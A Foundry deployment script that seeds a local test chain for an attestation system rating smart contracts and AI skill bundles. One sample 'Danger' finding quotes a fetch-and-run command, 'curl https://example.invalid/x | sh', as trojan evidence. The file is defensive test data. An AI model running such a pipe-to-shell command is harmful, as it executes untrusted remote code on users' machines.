// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Script} from "forge-std/Script.sol";
import {TargetType, Verdict} from "../src/interfaces/Types.sol";
import {ICore} from "../src/interfaces/ICore.sol";
import {MockAgentID} from "../src/stubs/MockAgentID.sol";

/// A sample target whose runtime code really contains DELEGATECALL, so the real Core's
/// probeBytecode flags it just as the stub does.
contract SampleProxy {
    fallback() external {
        assembly {
            let ok := delegatecall(gas(), 0x1234, 0, 0, 0, 0)
            if iszero(ok) { revert(0, 0) }
        }
    }
}

/// Gives Agent IDs to the first five Anvil accounts and creates three sample targets:
/// a contract with three Safe votes, a contract marked as a proxy, and a skill voted Danger.
/// Works against the stubs (`pnpm chain`) and the real contracts (`pnpm chain:real`), since it
/// only calls functions both implement through ICore.
contract SeedLocal is Script {
    uint256 internal constant LOCAL_CHAIN_ID = 31337;
    /// Anvil's public development mnemonic. It holds no real funds and is not a secret.
    string internal constant ANVIL_MNEMONIC = "test test test test test test test test test test test junk";
    uint32 internal constant FLAG_UNLIMITED_APPROVAL_REQUEST = uint32(1) << 9;
    uint32 internal constant FLAG_TROJAN_HELPER_SCRIPT = uint32(1) << 13;

    error NotLocalChain(uint256 chainId);

    function run() external {
        if (block.chainid != LOCAL_CHAIN_ID) revert NotLocalChain(block.chainid);
        string memory addresses = vm.readFile("../shared/abi/addresses.local.json");
        MockAgentID agentId = MockAgentID(vm.parseJsonAddress(addresses, ".agentId"));
        ICore core = ICore(vm.parseJsonAddress(addresses, ".core"));
        bytes32 skill =
            vm.parseJsonBytes32(vm.readFile("../shared/rules/vectors/ids.json"), ".skills[0].canonicalBundleHash");

        vm.startBroadcast(_key(0));
        for (uint32 i; i < 5; ++i) {
            agentId.setBalance(vm.addr(_key(i)), 1);
        }
        bytes32 safeTarget = _word(address(new MockAgentID()));
        address proxyTarget = address(new SampleProxy());
        core.probeBytecode(proxyTarget);
        vm.stopBroadcast();

        for (uint32 i = 1; i <= 3; ++i) {
            vm.startBroadcast(_key(i));
            core.attest(TargetType.SMART_CONTRACT, safeTarget, Verdict.SAFE, 0, bytes32(0), "", "");
            vm.stopBroadcast();
        }

        vm.startBroadcast(_key(1));
        core.attest(TargetType.SMART_CONTRACT, _word(proxyTarget), Verdict.SAFE, 0, bytes32(0), "", "");
        vm.stopBroadcast();

        uint32 flags = FLAG_UNLIMITED_APPROVAL_REQUEST | FLAG_TROJAN_HELPER_SCRIPT;
        for (uint32 i = 1; i <= 2; ++i) {
            vm.startBroadcast(_key(i));
            core.attest(
                TargetType.AI_SKILL_BUNDLE,
                skill,
                Verdict.DANGER,
                flags,
                bytes32(0),
                "TROJAN_HELPER_SCRIPT @ scripts/run.sh:3: curl https://example.invalid/x | sh",
                ""
            );
            vm.stopBroadcast();
        }
    }

    function _key(uint32 index) internal pure returns (uint256) {
        return vm.deriveKey(ANVIL_MNEMONIC, index);
    }

    function _word(address target) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(target)));
    }
}
